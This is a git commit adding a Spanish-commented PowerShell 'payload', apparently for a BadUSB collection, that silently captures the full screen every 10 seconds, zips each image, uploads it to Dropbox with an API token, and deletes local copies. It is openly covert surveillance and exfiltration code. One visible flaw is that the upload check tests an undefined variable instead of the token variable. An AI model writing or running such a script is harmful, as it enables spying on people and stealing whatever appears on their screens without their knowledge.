1d1ecf054c9fd26fc2740c689eb3327b3ac2c3e5
flippermen <99625153+dolaraso@users.noreply.github.com>
2024-10-07 16:31:08 -0500

    captura de pantalla
    Este nuevo  payload hace  captura de pantalla cada 10 seg y las manda a dropbox

---
+++ captura de pantalla discreta/captura.ps1
@@ -0,0 +1,95 @@
+Add-Type @'
+using System;
+using System.Runtime.InteropServices;
+using System.Drawing;
+
+public class DPI {
+  [DllImport("gdi32.dll")]
+  static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
+
+  public enum DeviceCap {
+  VERTRES = 10,
+  DESKTOPVERTRES = 117
+  }
+
+  public static float scaling() {
+  Graphics g = Graphics.FromHwnd(IntPtr.Zero);
+  IntPtr desktop = g.GetHdc();
+  int LogicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.VERTRES);
+  int PhysicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.DESKTOPVERTRES);
+
+  return (float)PhysicalScreenHeight / (float)LogicalScreenHeight;
+  }
+}
+'@ -ReferencedAssemblies 'System.Drawing.dll' -ErrorAction Stop
+
+# Define la API Token de Dropbox
+$db = ""
+
+# Archivo de señal para detener el script
+$stopSignalFile = "$env:TEMP\stop.txt"
+
+# Función para subir archivos a Dropbox
+function DropBox-Upload {
+    [CmdletBinding()]
+    param (
+        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+        [Alias("f")]
+        [string]$SourceFilePath
+    ) 
+    $outputFile = Split-Path $SourceFilePath -leaf
+    $TargetFilePath = "/$outputFile"
+    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+    $authorization = "Bearer " + $db
+    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+    $headers.Add("Authorization", $authorization)
+    $headers.Add("Dropbox-API-Arg", $arg)
+    $headers.Add("Content-Type", 'application/octet-stream')
+    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+}
+
+# Bucle principal para la captura de pantallas
+while ($true) {
+    # Verificar si existe el archivo de señalización para detener el script
+    if (Test-Path $stopSignalFile) {
+        Write-Host "Archivo de señalización detectado. Deteniendo el script."
+        Remove-Item $stopSignalFile -Force
+        exit
+    }
+
+    # Add necessary types
+    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+
+    # Get virtual screen information
+    $s = [System.Windows.Forms.SystemInformation]::VirtualScreen
+
+    # Create a bitmap of the virtual screen size
+    $b = New-Object System.Drawing.Bitmap ([int32]([math]::round($($s.Width * [DPI]::scaling()), 0))),([int32]([math]::round($($s.Height * [DPI]::scaling()), 0)));
+    [System.Drawing.Graphics]::FromImage($b).CopyFromScreen($s.Left, $s.Top, 0, 0, $b.Size)
+
+    # Crear un directorio temporal para almacenar el archivo
+    $folderDateTime = (Get-Date).ToString('yyyy-MM-dd_HH-mm-ss')
+    $userDir = "$env:USERPROFILE\Documents\Screenshots_$folderDateTime"
+    New-Item -Path $userDir -ItemType Directory
+
+    # Guardar el bitmap en PNG
+    $fileName = "$env:COMPUTERNAME-$(Get-Date -Format HHmmss).png"
+    $filePath = "$userDir\$fileName"
+    $b.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
+
+    # Comprimir el archivo PNG
+    Compress-Archive -Path $filePath -DestinationPath "$userDir.zip"
+    $zipFile = "$userDir.zip"
+
+    # Subir a Dropbox
+    if (-not ([string]::IsNullOrEmpty($dropboxToken))) {
+        DropBox-Upload -SourceFilePath $zipFile
+    }
+
+    # Limpieza
+    Remove-Item -Path $userDir -Recurse
+    Remove-Item -Path $zipFile
+
+    # Esperar 10 segundos antes de la siguiente iteración
+    Start-Sleep -Seconds 10
+}
